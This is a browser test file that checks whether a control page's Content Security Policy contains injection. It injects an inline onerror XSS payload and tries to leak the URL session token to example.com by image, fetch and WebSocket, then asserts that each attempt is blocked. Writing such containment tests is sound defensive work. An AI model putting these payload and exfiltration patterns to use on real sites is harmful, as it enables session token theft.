/**
 * The CSP on the control page is a containment layer: injection is already
 * prevented in the renderer, and this is what stops a *future* injection bug
 * from becoming a session takeover.
 *
 * A policy can only be verified by a browser that enforces it, which is the
 * whole reason these tests are not in Node. They assert both directions: the
 * attack is contained, and the page still works.
 */
import { describe, it, before, after } from 'node:test';
import assert from 'node:assert';
import { startStaticServer, launchBrowser } from './harness.js';
import { WebSocketServer } from 'ws';

describe('Control page CSP (browser)', () => {
  let statics;
  let browser;
  let wss;
  let page;
  let refusals;

  before(async () => {
    statics = await startStaticServer();
    // A same-origin WebSocket endpoint, as Caddy would proxy it.
    wss = new WebSocketServer({ server: statics.server, path: '/ws' });
    wss.on('connection', (ws) => ws.on('message', () => {}));

    browser = await launchBrowser();
    page = await browser.newPage();
    refusals = [];
    page.on('console', (m) => {
      const text = m.text();
      if (/Refused to|Content Security Policy/i.test(text)) refusals.push(text);
    });
    await page.goto(`${statics.origin}/control.html?token=SECRET-TOKEN-a1b2c3&room=ROOM01`);
    await page.waitForTimeout(500);
  });

  after(async () => {
    await browser.close();
    await new Promise((resolve) => wss.close(resolve));
    await statics.close();
  });

  it('blocks an inline event handler injected into the DOM', async () => {
    // Injected directly, bypassing every application-level fix, so that only
    // the CSP stands between the payload and execution.
    const fired = await page.evaluate(async () => {
      window.__fired = false;
      window.__hit = () => { window.__fired = true; };
      document
        .getElementById('content')
        .insertAdjacentHTML('beforeend', '<img src="x" onerror="window.__hit()">');
      await new Promise((r) => setTimeout(r, 300));
      return window.__fired;
    });
    assert.strictEqual(fired, false, 'CSP did not block the inline handler');
    assert.ok(
      refusals.some((r) => /inline event handler/i.test(r)),
      'no CSP refusal was reported for the inline handler'
    );
  });

  it('blocks token exfiltration by image, fetch and WebSocket', async () => {
    await page.evaluate(async () => {
      try { new Image().src = 'https://example.com/leak?' + location.search; } catch { /* blocked */ }
      try { await fetch('https://example.com/leak?' + location.search); } catch { /* blocked */ }
      try { new WebSocket('wss://example.com/leak'); } catch { /* blocked */ }
      await new Promise((r) => setTimeout(r, 400));
    });

    const leaks = refusals.filter((r) => r.includes('example.com'));
    assert.ok(leaks.some((r) => /image/i.test(r)), 'image exfiltration was not refused');
    assert.ok(leaks.some((r) => /fetch|connect/i.test(r)), 'fetch exfiltration was not refused');
    assert.ok(leaks.some((r) => /wss:/i.test(r)), 'WebSocket exfiltration was not refused');
  });

  it("still allows the page's own same-origin WebSocket", async () => {
    // connect-src 'self' matches ws:/wss: on the same origin. If this ever
    // regresses, the control view silently stops working in production.
    const connected = await page.evaluate(
      () =>
        new Promise((resolve) => {
          const ws = new WebSocket(location.origin.replace(/^http/, 'ws') + '/ws');
          ws.onopen = () => resolve(true);
          ws.onerror = () => resolve(false);
          setTimeout(() => resolve(false), 2000);
        })
    );
    assert.strictEqual(connected, true, "connect-src 'self' blocked the control WebSocket");
  });

  it('still loads its stylesheets and applies inline style attributes', async () => {
    const view = await page.evaluate(async () => {
      document
        .getElementById('content')
        .insertAdjacentHTML('beforeend', '<span id="styled" style="color:rgb(7,7,7)">x</span>');
      await new Promise((r) => setTimeout(r, 200));
      return {
        sheets: document.styleSheets.length,
        color: getComputedStyle(document.getElementById('styled')).color
      };
    });

    assert.ok(view.sheets >= 3, 'stylesheets did not load under the policy');
    // Needs style-src-attr 'unsafe-inline'; without it the attribute is dropped
    // silently and lecturer-authored SVG loses its colours.
    assert.strictEqual(view.color, 'rgb(7, 7, 7)', 'inline style attribute was dropped');
  });
});
